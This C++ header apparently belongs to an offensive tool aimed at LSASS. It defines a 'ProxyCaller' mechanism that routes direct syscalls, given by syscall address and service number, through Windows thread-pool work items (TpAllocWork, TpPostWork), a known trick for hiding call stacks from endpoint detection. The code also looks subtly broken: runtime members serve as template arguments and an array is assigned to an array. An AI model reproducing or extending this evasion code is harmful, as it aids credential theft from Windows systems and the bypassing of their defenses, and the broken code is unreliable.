#ifndef LSASSC_PROXYCALLER_H
#define LSASSC_PROXYCALLER_H

#include <windows.h>
#include "Native.h"
#include "Macros.h"

EXTERN_C VOID CALLBACK ProxyCaller(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

struct HELPER {
    D_TYPE(TpAllocWork)
    D_TYPE(TpPostWork)
    D_TYPE(TpReleaseWork)
};

EXTERN HELPER* pHelper;

template<UINT_PTR I, DWORD S, UINT64 N>
struct SYSCALL_ARGS {
    UINT_PTR    pSyscallInstruction = I;
    UINT_PTR    dwSsn               = S;
    UINT64      argCount            = N;
    UINT_PTR    pArgs[N];
};

template<UINT64 N, AUTO S>
struct SYSCALL {
    UINT_PTR    pSyscallInstruction;
    UINT_PTR    dwSsn;
    __typeof__(S)* Call;

    VOID ProxyCall(UINT_PTR pArgs[N]) {
        SYSCALL_ARGS<pSyscallInstruction, dwSsn, N> syscallArgs;
        PTP_WORK WorkReturn = NULL;
        syscallArgs.pArgs = pArgs;

        pHelper->TpAllocWork(
                &WorkReturn,
                (PTP_WORK_CALLBACK)ProxyCaller,
                &syscallArgs,
                NULL
                );

        pHelper->TpPostWork(WorkReturn);
        pHelper->TpReleaseWork(WorkReturn);
        WaitForSingleObject((HANDLE)-1, 4096);
    }
};

#endif //LSASSC_PROXYCALLER_H
